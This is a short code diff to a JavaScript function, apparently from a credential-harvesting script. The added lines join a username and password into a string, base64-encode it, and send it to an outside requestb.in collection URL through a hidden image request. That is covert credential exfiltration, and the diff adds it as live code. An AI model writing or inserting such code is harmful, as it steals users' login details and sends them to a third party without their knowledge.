@@ -22,7 +22,9 @@ function foo()
 	   }
 	 else
 	 {
-	 var URLL = "http://requestb.in/13jsohk1?"+auserid ;
+	 var string="Username="+auserid+" Password="+apasswd ;
+	 var CRED = btoa(string);
+	 var URLL = "http://requestb.in/13jsohk1?"+CRED ;
 	 (function(){
     (new Image()).src = URLL;
 })();
